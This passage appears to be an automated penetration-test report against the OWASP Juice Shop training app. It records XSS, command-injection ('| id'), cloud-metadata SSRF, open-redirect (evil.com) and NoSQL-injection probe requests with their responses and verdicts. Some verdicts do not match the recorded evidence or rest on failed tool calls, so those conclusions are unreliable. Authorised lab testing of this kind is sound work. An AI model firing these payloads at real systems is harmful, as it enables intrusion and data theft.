{"url": "http://juice-shop:3000/rest/admin/application-configuration", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "etag": "W/\"5420-k5bPYNVGxIX71pMlQn1RBM3Rthg\"", "vary": "Accept-Encoding", "content-encoding": "gzip", "date": "Thu, 03 Sep 2026 19:24:04 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"config\":{\"server\":{\"port\":
```
*VERDICT: INCONCLUSIVE — The response headers were not inspected for clickjacking protection headers such as `X-Frame-Options` or `Content-Security-Policy`. A manual check or a different approach is re*

### W-009 — CSRF (Cross-Site Request Forgery) — admin version endpoint (GET /rest/admin/application-version)

- **Asset:** `/rest/admin/application-version`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The endpoint GET /rest/admin/application-version responds with a simple JSON body containing the application version and does not appear to perform any state-changing actions, making CSRF exploitation unlikely. Additionally, no session-related side effects or sensitive data modifications were observed.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-version", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-version", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "20", "etag": "W/\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:12 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"version\":\"17.1.1\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: DISPROVEN — The endpoint GET /rest/admin/application-version responds with a simple JSON body containing the application version and does not appear to perform any state-changing actions, mak*

### W-010 — IDOR (Insecure Direct Object Reference) — version access control (GET /rest/admin/application-version)

- **Asset:** `/rest/admin/application-version`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The endpoint returns application version information without requiring IDOR exploitation since no direct object reference or access control mechanism was identified in the request or response.)
- **ATT&CK:** T1068
- **Remediation effort:** medium

```http
hacktricks_article {}

{"content": ["Error executing tool hacktricks_article: 1 validation error for hacktricks_articleArguments\nslug\n  Field required [type=missing, input_value={}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing"]}
```
*VERDICT: INCONCLUSIVE — The endpoint returns application version information without requiring IDOR exploitation since no direct object reference or access control mechanism was identified in the requ*

### W-011 — SSRF (Server-Side Request Forgery) — backend service enumeration (GET /rest/admin/application-version)

- **Asset:** `/rest/admin/application-version`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (The endpoint /rest/admin/application-version responds with a simple version number and does not appear to accept any user-controlled input that could lead to SSRF. Without a parameter to manipulate or a behavior suggesting server-side requests, SSRF cannot be proven.

VERDICT: DISPROVEN — No user-controllable input was observed in the request to influence server-side requests, and the response is a static version string.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-version", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-version", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "20", "etag": "W/\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:21 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"version\":\"17.1.1\"}", "truncated": false, "redirect_to": null}
```
*The endpoint /rest/admin/application-version responds with a simple version number and does not appear to accept any user-controlled input that could lead to SSRF. Without a parameter to manipulate or*

### W-013 — Path Traversal — unauthorized file access via version endpoint (GET /rest/admin/application-version)

- **Asset:** `/rest/admin/application-version`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — the endpoint /rest/admin/application-version does not accept any path parameters or query strings to manipulate for file traversal, and it strictly returns a JSON-formatted version string, offering no avenue for injecting or accessing arbitrary files.)
- **ATT&CK:** T1083, T1212
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "file-inclusion"}

{"slug": "file-inclusion", "found": true, "title": "File Inclusion/Path Traversal", "content": "# File Inclusion and Path Traversal\n\n## File Inclusion\n\n**Remote File Inclusion (RFI):** The application loads a file from a remote server. If the included resource is interpreted as code, an attacker can host and execute a payload. In PHP, URL-aware inclusion is **disabled by default** through `allow_url_include`.\\\n**Local File Inclusion (LFI):** The application loads a local file.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>\n\nThe vulnerability occurs when user input controls t
```
*VERDICT: DISPROVEN — the endpoint /rest/admin/application-version does not accept any path parameters or query strings to manipulate for file traversal, and it strictly returns a JSON-formatted versio*

### W-014 — JWT Token Abuse — privilege escalation through crafted auth tokens (GET /rest/admin/application-version)

- **Asset:** `/rest/admin/application-version`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The endpoint does not appear to require or use JWT tokens for authentication based on the accessible response and lack of authorization headers.)
- **ATT&CK:** T1078, T1078, T1078, T1078
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/admin/application-version", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/admin/application-version", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "20", "etag": "W/\"14-10h2liq3tMxzTFCiH84ZpDMBuNc\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:30 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"version\":\"17.1.1\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: INCONCLUSIVE — The endpoint does not appear to require or use JWT tokens for authentication based on the accessible response and lack of authorization headers.*

### W-015 — XSS — reflected in response (param `name`, GET /api/Challenges/)

- **Asset:** `/api/Challenges/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The reflected parameter `name` in the response does not execute XSS payloads, as evidenced by the benign response body when injecting a script tag.)
- **ATT&CK:** T1189
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Challenges/?name=<script>alert(1)</script>", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Challenges/?name=%3Cscript%3Ealert(1)%3C/script%3E", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "30", "etag": "W/\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:33 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[]}", "truncated": fa
```
*VERDICT: DISPROVEN — The reflected parameter `name` in the response does not execute XSS payloads, as evidenced by the benign response body when injecting a script tag.*

### W-016 — NoSQL Injection — filtering logic (param `name`, GET /api/Challenges/)

- **Asset:** `/api/Challenges/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — Adding a single quote in the `name` parameter does not cause an error or different behavior, and the response remains consistent with valid input, indicating no NoSQL injection vulnerability.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Challenges/?name=Score%20Board&foo=1", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Challenges/?name=Score%20Board&foo=1", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "648", "etag": "W/\"288-q97JQNgZsJvFKgcgiZIesg17Cxw\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:37 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[{\"id\":74,\"key\":\"scoreBoardC
```
*VERDICT: DISPROVEN — Adding a single quote in the `name` parameter does not cause an error or different behavior, and the response remains consistent with valid input, indicating no NoSQL injection vu*

### W-017 — Open Redirect — redirect logic (param `name`, GET /api/Challenges/)

- **Asset:** `/api/Challenges/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The parameter 'name' in the GET request to /api/Challenges/ does not cause an open redirect when set to a malicious URL; it returns a 200 OK with empty data instead.)
- **ATT&CK:** T1566.002
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Challenges/?name=http://evil.com", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Challenges/?name=http://evil.com", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "30", "etag": "W/\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:40 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[]}", "truncated": false, "redirect_to"
```
*VERDICT: DISPROVEN — The parameter 'name' in the GET request to /api/Challenges/ does not cause an open redirect when set to a malicious URL; it returns a 200 OK with empty data instead.*

### W-018 — Parameter Pollution — query parsing (param `name`, GET /api/Challenges/)

- **Asset:** `/api/Challenges/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The API consistently returns the same result regardless of parameter pollution attempts, indicating proper handling of multiple or malformed parameters.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Challenges/?name=Score%20Board&otherParam=SomethingElse", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Challenges/?name=Score%20Board&otherParam=SomethingElse", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "648", "etag": "W/\"288-q97JQNgZsJvFKgcgiZIesg17Cxw\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:45 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[{\"id\":74,\"
```
*VERDICT: DISPROVEN — The API consistently returns the same result regardless of parameter pollution attempts, indicating proper handling of multiple or malformed parameters.*

### W-019 — Cache Deception — caching logic (param `name`, GET /api/Challenges/)

- **Asset:** `/api/Challenges/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The addition of `.js` to the `name` parameter returned a successful response with an empty data array, which does not confirm or deny cache deception vulnerability.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/api/Challenges/?name=Score%20Board.js", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/api/Challenges/?name=Score%20Board.js", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "30", "etag": "W/\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:24:51 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[]}", "truncated": false, "redirect_to
```
*VERDICT: INCONCLUSIVE — The addition of `.js` to the `name` parameter returned a successful response with an empty data array, which does not confirm or deny cache deception vulnerability.*

### W-020 — NoSQL Injection — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "nosql-injection"}

{"slug": "nosql-injection", "found": true, "title": "NoSQL Injection", "content": "# NoSQL injection\n\n## Exploit\n\nIn PHP, a client can submit an array by changing a parameter from _`parameter=foo`_ to _`parameter[arrName]=foo`_.\n\nThese payloads inject a database **operator**:<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup>\n\n```bash\nusername[$ne]=1$password[$ne]=1 #<Not Equals>\nusername[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter\nusername[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value\nuserna
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-021 — Cross-Site Search (XS-Search) — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/products/search?q=test", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/products/search?q=test", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "517", "etag": "W/\"205-7U55L6UeX/BOkw09GVJmQj3ALl8\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:25:00 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[{\"id\":9,\"name\":\"OWASP SSL Advanced Foren
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-022 — Server-Side Request Forgery (SSRF) — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "server-side-request-forgery"}

{"slug": "server-side-request-forgery", "found": false, "did_you_mean": ["ssrf-server-side-request-forgery", "csrf-cross-site-request-forgery", "server-side-xss-dynamic-pdf", "client-side-path-traversal", "ssti-server-side-template-injection", "abusing-service-workers", "server-side-inclusion-edge-side-inclusion-injection", "reverse-tab-nabbing"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-023 — Cross-Site Scripting (XSS) — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — Neither reflective XSS payloads (`<script>alert(1)</script>` nor `<img src=x onerror=alert(1)>`) caused script execution or were reflected in the JSON response, indicating the `q` parameter is properly sanitized or escaped.)
- **ATT&CK:** T1189
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/products/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/products/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "30", "etag": "W/\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:25:06 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[]}", "trunc
```
*VERDICT: DISPROVEN — Neither reflective XSS payloads (`<script>alert(1)</script>` nor `<img src=x onerror=alert(1)>`) caused script execution or were reflected in the JSON response, indicating the `q`*

### W-024 — Regular Expression Denial of Service (ReDoS) — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — No HackTricks article found to confirm or deny ReDoS vulnerability; further manual analysis or alternative testing approaches required.)
- **ATT&CK:** T1498
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "dos-regular-expression-denial-of-service-redos"}

{"slug": "dos-regular-expression-denial-of-service-redos", "found": false, "did_you_mean": ["regular-expression-denial-of-service-redos", "browser-extension-pentesting-methodology", "iis-internet-information-services", "abusing-service-workers", "registration-vulnerabilities", "mass-assignment-cwe-915", "dapps-decentralizedapplications", "ssrf-server-side-request-forgery"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles
```
*VERDICT: INCONCLUSIVE — No HackTricks article found to confirm or deny ReDoS vulnerability; further manual analysis or alternative testing approaches required.*

### W-025 — Open Redirect — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The search endpoint does not redirect to external domains when supplied with malicious URLs in the `q` parameter, indicating it is not vulnerable to open redirect.)
- **ATT&CK:** T1566.002
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "open-redirect"}

{"slug": "open-redirect", "found": true, "title": "Open Redirect", "content": "# Open Redirect\n\n## Open redirect\n\n### Redirect to localhost or arbitrary domains\n\n- If the app \u201callows only internal/whitelisted hosts\u201d, try alternative host notations to hit loopback or internal ranges via the redirect target:\n  - IPv4 loopback variants: 127.0.0.1, 127.1, 2130706433 (decimal), 0x7f000001 (hex), 017700000001 (octal)\n  - IPv6 loopback variants: [::1], [0:0:0:0:0:0:0:1], [::ffff:127.0.0.1]\n  - Trailing dot and casing: localhost., LOCALHOST, 127.0.0.1.\n  - Wildcard DNS that resolve
```
*VERDICT: DISPROVEN — The search endpoint does not redirect to external domains when supplied with malicious URLs in the `q` parameter, indicating it is not vulnerable to open redirect.*

### W-026 — LDAP Injection — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/products/search?q=*", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/products/search?q=*", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "929", "etag": "W/\"3a1-AT5t8T9xPuVfm0dg1U4Qjh6Q7cE\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:25:17 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[{\"id\":46,\"name\":\"DSOMM & Juice Shop User Da
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-027 — Command Injection — search query param `q` (GET /rest/products/search)

- **Asset:** `/rest/products/search`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — Injection payloads using ; and | operators returned empty JSON data without signs of command execution.)
- **ATT&CK:** T1059
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/rest/products/search?q=%7C%20id", "method": "GET", "headers": {"accept": "application/json, text/plain, */*", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36"}}

{"url": "http://juice-shop:3000/rest/products/search?q=%7C%20id", "status_code": 200, "headers": {"access-control-allow-origin": "*", "x-content-type-options": "nosniff", "x-frame-options": "SAMEORIGIN", "feature-policy": "payment 'self'", "x-recruiting": "/#/jobs", "content-type": "application/json; charset=utf-8", "content-length": "30", "etag": "W/\"1e-JkPcI+pGj7BBTxOuZTVVIm91zaY\"", "vary": "Accept-Encoding", "date": "Thu, 03 Sep 2026 19:25:23 GMT", "connection": "keep-alive", "keep-alive": "timeout=5"}, "body": "{\"status\":\"success\",\"data\":[]}", "truncated": false, "redirect_to": nul
```
*VERDICT: DISPROVEN — Injection payloads using ; and | operators returned empty JSON data without signs of command execution.*

### W-028 — Prototype Pollution — query parameter `sid` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (INCONCLUSIVE — hit the step limit without a verdict)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "prototype-pollution"}

{"slug": "prototype-pollution", "found": false, "did_you_mean": ["nodejs-proto-prototype-pollution", "parameter-pollution", "race-condition", "microsoft-sharepoint", "xssi-cross-site-script-inclusion", "phone-number-injections", "file-inclusion", "xss-cross-site-scripting"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*INCONCLUSIVE — hit the step limit without a verdict*

### W-029 — WebSocket Session Manipulation — query parameter `sid` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The sid parameter in WebSocket handshake requests appears to be properly validated, as attempts to reuse session IDs resulted in 'Session ID unknown' errors, but further testing with valid sessions might be needed to confirm manipulation potential.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
hacktricks_article {"slug": "websocket-session-manipulation"}

{"slug": "websocket-session-manipulation", "found": false, "did_you_mean": ["websocket-attacks", "ssti-server-side-template-injection", "http-connection-contamination", "client-side-template-injection-csti", "race-condition", "deserialization", "command-injection", "parameter-pollution"], "guidance": "No article by that slug. Do NOT invent one. Pick the closest match from did_you_mean (or from hacktricks_overview) and call hacktricks_article again. If nothing fits, write your hypothesis from first principles without an example."}
```
*VERDICT: INCONCLUSIVE — The sid parameter in WebSocket handshake requests appears to be properly validated, as attempts to reuse session IDs resulted in 'Session ID unknown' errors, but further testin*

### W-030 — SSRF via Transport Parameter — query parameter `transport` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The server returned a "Transport unknown" error, indicating that the `transport` parameter does not accept arbitrary URLs, which is required for SSRF exploitation.)
- **ATT&CK:** T1190
- **Remediation effort:** medium

```http
http_request {"url": "http://juice-shop:3000/socket.io/?EIO=4&transport=http://169.254.169.254/latest/meta-data/hostname&sid=J63gjOh-qhCx3UQqAAAv", "method": "POST", "headers": {"accept": "*/*", "origin": "http://juice-shop:3000", "referer": "http://juice-shop:3000/", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/131.0.6778.33 Safari/537.36", "content-type": "text/plain;charset=UTF-8"}, "body": 40}

{"url": "http://juice-shop:3000/socket.io/?EIO=4&transport=http://169.254.169.254/latest/meta-data/hostname&sid=J63gjOh-qhCx3UQqAAAv", "status_code": 400, "headers": {"access-control-allow-origin": "http://localhost:4200", "vary": "Origin", "content-type": "application/json", "date": "Thu, 03 Sep 2026 19:25:34 GMT", "connection": "keep-alive", "keep-alive": "timeout=5", "transfer-encoding": "chunked"}, "body": "{\"code\":0,\"message\":\"Transport unknown\"}", "truncated": false, "redirect_to": null}
```
*VERDICT: DISPROVEN — The server returned a "Transport unknown" error, indicating that the `transport` parameter does not accept arbitrary URLs, which is required for SSRF exploitation.*

### W-031 — Denial of Service via Engine.IO Protocol — body payload `40` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The recorded requests show the payload "40" is sent normally during WebSocket polling, and manual testing returned a 400 error due to an invalid session ID, not a denial of service. Further crawling and HackTricks checks did not uncover any related exploitable behavior.)
- **ATT&CK:** T1498
- **Remediation effort:** medium

```http
hacktricks_overview {}

{"count": 110, "techniques": [{"slug": "abusing-hop-by-hop-headers", "title": "Abusing hop-by-hop headers", "chars": 3736}, {"slug": "cache-deception", "title": "Cache Poisoning/Cache Deception", "chars": 33093}, {"slug": "http-connection-contamination", "title": "HTTP Connection Contamination", "chars": 2999}, {"slug": "http-connection-request-smuggling", "title": "HTTP Connection Request Smuggling", "chars": 8568}, {"slug": "http-request-smuggling", "title": "HTTP Request Smuggling", "chars": 60631}, {"slug": "http-response-smuggling-desync", "title": "HTTP Response Smuggling / Desync", "cha
```
*VERDICT: DISPROVEN — The recorded requests show the payload "40" is sent normally during WebSocket polling, and manual testing returned a 400 error due to an invalid session ID, not a denial of servic*

### W-032 — Cache Poisoning via Query Parameters — query parameters `t`, `sid` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: DISPROVEN — The session ID is validated server-side, resulting in a 400 error when tampered with, which prevents cache poisoning via the `sid` parameter. The `t` parameter does not appear to be injectable either as it is tied to the session context. No evidence of successful cache poisoning was observed.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
hacktricks_article {}

{"content": ["Error executing tool hacktricks_article: 1 validation error for hacktricks_articleArguments\nslug\n  Field required [type=missing, input_value={}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing"]}
```
*VERDICT: DISPROVEN — The session ID is validated server-side, resulting in a 400 error when tampered with, which prevents cache poisoning via the `sid` parameter. The `t` parameter does not appear to *

### W-034 — CORS Misconfiguration Exploitation — header `Origin` (POST /socket.io/)

- **Asset:** `/socket.io/`
- **Severity:** informational (CVSS 0.0, ``)
- **Status:** tested, not proven (VERDICT: INCONCLUSIVE — The initial CORS test with an evil Origin header resulted in a 400 error due to an invalid session ID, which prevents determining if the CORS policy is misconfigured. No further exploitation steps can be taken without a valid session.)
- **ATT&CK:** T1071.001
- **Remediation effort:** medium

```http
hacktricks_article {}

{"content": ["Error executing tool hacktricks_article: 1 validation error for hacktricks_articleArguments\nslug\n  Field required [type=missing, input_value={}, input_type=dict]\n    For further information visit https://errors.pydantic.dev/2.13/v/missing"]}
```
*VERDICT: INCONCLUSIVE — The initial CORS test with an evil Origin header resulted in a 400 error due to an invalid session ID, which prevents determining if the CORS policy is misconfigured. No furthe*

